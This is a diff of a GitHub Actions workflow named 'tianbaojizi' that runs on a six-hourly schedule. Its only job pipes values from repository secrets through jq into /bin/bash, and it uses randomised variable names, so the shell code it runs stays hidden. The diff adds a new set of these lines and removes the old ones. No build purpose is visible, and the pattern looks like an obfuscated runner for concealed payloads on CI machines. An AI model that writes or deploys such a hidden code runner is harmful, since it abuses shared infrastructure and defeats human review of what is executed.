@@ -1,25 +1,31 @@
 name: tianbaojizi
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 3/6 * * *'
-
+    - cron: '14 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: tianbaojizi
         env:
-          mqg04: ${{ secrets.mqg04 }}
+          znqao19: ${{ secrets.znqao19 }}
         run: |
-          echo $mqg04 | jq -r .oi2654 | /bin/bash
-          echo $jx16 | jq -r .xr078 | /bin/bash
-          echo $jgu2732 | jq -r .gcot7170 | /bin/bash
-          echo $twk700 | jq -r .n136 | /bin/bash
-          echo $jhicb673 | jq -r .uhc2664 | /bin/bash
-          echo $q1 | jq -r .npp21317 | /bin/bash
-          echo $lwbue21 | jq -r .j2138 | /bin/bash
-          echo $vxn28441 | jq -r .r7077 | /bin/bash
+          echo $znqao19 | jq -r .kkhgo903 | /bin/bash
+          echo $kyzar07827 | jq -r .ktwbz14721 | /bin/bash
+          echo $ggqw751 | jq -r .ugfve78 | /bin/bash
+          echo $k83 | jq -r .bpl026 | /bin/bash
+          echo $w4017 | jq -r .rjy372 | /bin/bash
+          echo $rwcj037 | jq -r .okz22 | /bin/bash
+          echo $vsxw3300 | jq -r .fyhc60 | /bin/bash
+          echo $oil159 | jq -r .v577 | /bin/bash
+          echo $n39 | jq -r .vcbh490 | /bin/bash
+          echo $u2 | jq -r .kptgs586 | /bin/bash
+          echo $blbw2 | jq -r .c2 | /bin/bash
+          echo $hwa6497 | jq -r .k14 | /bin/bash
+          echo $tnfwu61132 | jq -r .jha457 | /bin/bash
+          echo $hav3 | jq -r .pl2324 | /bin/bash
+          echo $t84 | jq -r .f536 | /bin/bash
 
